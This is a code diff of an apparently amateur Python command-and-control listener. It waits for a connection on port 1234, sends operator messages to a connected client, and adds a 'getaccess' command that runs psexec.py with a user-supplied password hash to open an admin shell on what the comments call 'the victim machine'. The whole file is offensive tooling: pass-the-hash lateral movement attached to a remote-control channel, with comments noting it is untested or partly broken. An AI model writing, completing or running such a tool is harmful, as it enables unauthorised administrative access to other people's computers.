@@ -9,7 +9,7 @@ def connectToMachine():
     userName = input("Enter the name of the user with admin rights: ")
     dir = os.getcwd()
     cmnd = "python psexec.py -hashes " + hashToEnter + " " + userName + "@" + address + " cmd.exe"
-    subprocess.call(cmnd, cwd=dir, shell=True)
+    subprocess.Popen(cmnd, cwd=dir, shell=True)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(("0.0.0.0", 1234))
@@ -24,9 +24,24 @@ print(f"Connection from {address} has been established.")
 while True:
 
     msgToSend = input("Enter your message: ")
+
+    ## NOT TESTED YET ##############################################
+    # This should create a new terminal that is connected to the victim machine
+    # If the correct account is chosen, this terminal will have admin privileges
+    if msgToSend == "getaccess":
+        connectToMachine()
+    ################################################################
+    # Closes the socket and terminates the connection (hopefully) ##
+    elif msgToSend == "terminate":
+        s.close()
+        break
+    #################################################################
+
     clientsocket.send(bytes(msgToSend,"utf-8"))
     #this does not work currently since it gets an error
     msg = clientsocket.recv(1024)
     decodedMsg = msg.decode("utf-8")
     print(decodedMsg)
+
+
 
